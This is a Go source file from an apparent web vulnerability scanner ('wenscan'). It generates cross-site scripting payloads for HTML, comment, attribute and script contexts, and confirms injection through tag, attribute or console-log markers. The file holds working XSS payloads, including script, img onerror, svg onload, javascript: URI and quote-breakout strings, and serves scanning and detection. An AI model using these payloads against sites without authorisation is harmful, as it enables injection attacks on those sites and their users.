package Xss

import (
	"bytes"
	"fmt"
	"math/rand"
	"net/url"
	"strings"
	"time"
	log "wenscan/Log"
	ast "wenscan/ast"
	http "wenscan/http"

	"github.com/thoas/go-funk"
)

type Xss struct {
	RawString string
	Url       *url.URL
	Query     *url.Values
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

var (
	Htmlmode = 1
	Comment  = 2
	Attibute = 3
	Script   = 4
)

var (
	CheckTag        = 1 //检测标签
	CheckValue      = 2 //检测值
	CheckConsoleLog = 3 //检测控制台输出
)

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

var (
	script_payload string = "<ScRiPt>%s</sCrIpT>"
	img_payload    string = "<img src/onerror=alert(1)>"
	//img_payload1   string = "\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u002f\u0064\u006f\u006d\u002d\u0078\u0073\u0073\u002f\u0029"
	href_payload   string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
	svg_payload    string = "<sVg/OnLoAd=%s>"
	iframe_payload string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
	input_payload  string = "<input autofocus onfocus=%s>"
	svg_payload1   string = "><sVg/OnLoAd=%s>"
	svg_payload2   string = "\"><sVg/OnLoAd=%s>"
	svg_payload3   string = "'><sVg/OnLoAd=%s>"
)

var (
	flag_tag1       string = "'><%s>//"
	flag_tag2       string = "\"><%s>//"
	flag_tag3       string = " ><%s>// "
	flag_Attibutes1 string = "'%s=prompt(1)'"
	flag_Attibutes2 string = "\"%s=prompt(1)\""
	flag_Attibutes3 string = " %s=prompt(1) "
)

var (
	comment_payload1 string = "--><%s>"
	comment_payload2 string = "--!><%s>"
)

var (
	javascript string = "javascript:console.log('%s')"
)

//Generator words和 extension 是映射关系
type Generator struct {
	i          int
	value      string
	IsNeedFlag bool
	mode       int
	words      []string
	extension  []PayloadMode
	flag       string
}

func (g *Generator) Next() bool {
	if g.i == len(g.words) {
		return false
	}
	g.value = g.words[g.i]
	g.mode = g.extension[g.i].Mode
	g.IsNeedFlag = g.extension[g.i].IsNeedFlag
	g.i++
	return true
}

func (g *Generator) Value() interface{} {
	return g.value
}

type Kv struct {
	K bytes.Buffer
	V bytes.Buffer
}

type PayloadMode struct {
	Mode       int
	IsNeedFlag bool
	payload    string
}

//CheckHtmlNodeAttributesKey 检测是否存在对应的key值
func CheckHtmlNodeAttributes(s ast.Occurence, types string, name string, HasPrefix bool) (bool, Kv) {
	var Attributes Kv
	c := funk.Map(*s.Details.Attributes, func(A ast.Attribute) bool {
		if HasPrefix {
			if types == "key" {
				if strings.HasPrefix(A.Key, name) {
					Attributes.K.Reset()
					Attributes.V.Reset()
					Attributes.K.WriteString(A.Key)
					Attributes.V.WriteString(A.Key)
					return true
				}
			} else {
				if strings.HasPrefix(A.Val, name) {
					Attributes.K.Reset()
					Attributes.V.Reset()
					Attributes.K.WriteString(A.Key)
					Attributes.V.WriteString(A.Key)
					return true
				}
			}
		} else {
			if types == "key" {
				if A.Key == name {
					Attributes.K.Reset()
					Attributes.V.Reset()
					Attributes.K.WriteString(A.Key)
					Attributes.V.WriteString(A.Key)
					return true
				}
			} else {
				if A.Val == name {
					Attributes.K.Reset()
					Attributes.V.Reset()
					Attributes.K.WriteString(A.Key)
					Attributes.V.WriteString(A.Key)
					return true
				}
			}
		}
		return false
	})
	if funk.Contains(c, true) {
		return true, Attributes
	}
	return false, Attributes
}

func Test_CheckHtmlNodeAttributesKey() {
	detail := ast.Node{Tagname: "attibute", Content: "key", Attributes: &[]ast.Attribute{{Key: "srcdoc", Val: "dsadsadadsa"}}}
	test := ast.Occurence{Details: detail}
	if ok, _ := CheckHtmlNodeAttributes(test, "key", "srcdoc", false); ok {
		log.Debug("ok")
	}
}

//给payload做扩展属性
func (g *Generator) mapmode(Mode int, IsNeedFlag bool) {
	mode := funk.Map(g.words, func(payload string) PayloadMode {
		var mode PayloadMode
		mode.Mode = Mode
		mode.IsNeedFlag = IsNeedFlag
		mode.payload = payload
		return mode
	})
	if v, ok := mode.([]PayloadMode); ok {
		g.extension = append(g.extension, v...)
	}
}

//GeneratorPayload 生成payload放入迭代器中，建议一个类型的标签只调用一次
/*
mode 标签模式
flag 随机数
checktype 检测类型，生成的payload是以什么形式进行检测
extension 扩展类型
*/
func (g *Generator) GeneratorPayload(Tagmode int, flag string, extension interface{}) interface{} {
	g.flag = flag
	if Htmlmode == Tagmode {
		htmlpayload := []string{script_payload,
			img_payload,
			href_payload,
			svg_payload,
			iframe_payload,
			input_payload,
			svg_payload1,
			svg_payload2,
			svg_payload3}
		g.words = append(g.words, htmlpayload...)
		g.mapmode(CheckValue, true)
	} else if Comment == Tagmode {
		commentpayload := []string{comment_payload1, comment_payload2}
		g.words = append(g.words, commentpayload...)
		g.mapmode(CheckTag, true)
	} else if Attibute == Tagmode {
		switch s := extension.(type) {
		case ast.Occurence:
			if funk.Contains(s.Type, "key") {
				KeyPayload := []string{script_payload,
					img_payload,
					href_payload,
					svg_payload,
					iframe_payload,
					input_payload,
					svg_payload1,
					svg_payload2,
					svg_payload3}
				g.words = append(g.words, KeyPayload...)
				g.mapmode(CheckValue, true)
			} else if funk.Contains(s.Type, "value") {
				if ok, _ := CheckHtmlNodeAttributes(s, "key", "srcdoc", false); ok {
					//替换'<'和'>'为 url 编码
					ValuePayload := []string{script_payload,
						img_payload,
						href_payload,
						svg_payload,
						iframe_payload,
						input_payload,
						svg_payload1,
						svg_payload2,
						svg_payload3}
					newValuePayload := funk.Map(ValuePayload, func(payload string) string {
						Lstr := strings.Replace(payload, "<", "%26lt;", -1)
						Rstr := strings.Replace(Lstr, ">", "%26gt;", -1)
						return Rstr
					})
					switch v := newValuePayload.(type) {
					case []string:
						g.words = append(g.words, v...)
						g.mapmode(CheckValue, true)
					}
				}
				//处理链接属性
				ok, _ := CheckHtmlNodeAttributes(s, "key", "href", false)
				ok1, _ := CheckHtmlNodeAttributes(s, "val", flag, false)
				if ok && ok1 {
					ValuePayload := []string{javascript}
					g.words = append(g.words, ValuePayload...)
					g.mapmode(CheckConsoleLog, false)
				}
				//处理onerror等on开头的属性情况
				if ok, Kv := CheckHtmlNodeAttributes(s, "key", "on", true); ok {
					script := Kv.V.String()
					payload, err := ast.AnalyseJSFuncByFlag(flag, script)
					if err != nil {
						return err
					}
					log.Info("Attributes generator payload:%s", payload)
					g.words = append(g.words, payload)
					g.mapmode(CheckConsoleLog, false)
				}
				//处理默认情况
				ValuePayload0 := []string{flag_tag1, flag_tag2, flag_tag3}
				g.words = append(g.words, ValuePayload0...)
				g.mapmode(CheckTag, true)
				ValuePayload1 := []string{flag_Attibutes1, flag_Attibutes2, flag_Attibutes3}
				g.words = append(g.words, ValuePayload1...)
				g.mapmode(CheckConsoleLog, false)
			}
		}
	} else if Script == Tagmode {
		switch s := extension.(type) {
		case ast.Occurence:
			payload, err := ast.AnalyseJSFuncByFlag(flag, s.Details.Content)
			if err != nil {
				return err
			}
			log.Info("Script generator payload:%s", payload)
			payloads := []string{payload}
			g.words = append(g.words, payloads...)
			test1 := fmt.Sprintf("';alert(%s);//", flag)
			g.words = append(g.words, test1)
			g.mapmode(CheckConsoleLog, false)
		}
	}
	return nil
}

//GetPayloadValue 迭代 payload
func (g *Generator) GetPayloadValue() (string, int) {
	if g.Next() {
		if g.IsNeedFlag {
			switch v := g.Value().(type) {
			case string:
				return fmt.Sprintf(v, g.flag), g.mode
			}
		} else {
			switch v := g.Value().(type) {
			case string:
				return v, g.mode
			}
		}
	}

	return "", 0
}

//CheckXssVul 检测Xss漏洞
func (g *Generator) CheckXssVul(locations []ast.Occurence, methods int, extension interface{}) bool {
	var VulOK bool
	if methods == CheckValue {
		for _, location := range locations {
			if location.Type == "attibute" {
				for _, Attributes := range *location.Details.Attributes {
					if Attributes.Key == g.flag || Attributes.Val == g.flag {
						VulOK = true
						break
					}
				}
			} else if location.Details.Content == g.flag {
				VulOK = true
				break
			}
		}
	}
	if methods == CheckTag {
		for _, location := range locations {
			if location.Type == "attibute" {
				for _, Attributes := range *location.Details.Attributes {
					if Attributes.Key == g.flag || Attributes.Val == g.flag {
						VulOK = true
						break
					}
				}
			} else if location.Details.Tagname == g.flag {
				VulOK = true
				break
			}
		}
	}
	//判断执行的payload是否存在闭合标签，目前是用console.log(flag)要捕获控制台输出，你可以改别的好判断
	if methods == CheckConsoleLog {
		switch ev := extension.(type) {
		case http.Spider:
			select {
			case responseS := <-ev.Responses:
				for _, response := range responseS {
					if v, ok := response["log"]; ok {
						if v == g.flag {
							return true
						}
					}
				}
			case <-time.After(time.Duration(5) * time.Second):
				return false
			}
			return false
		}
	}

	return VulOK
}
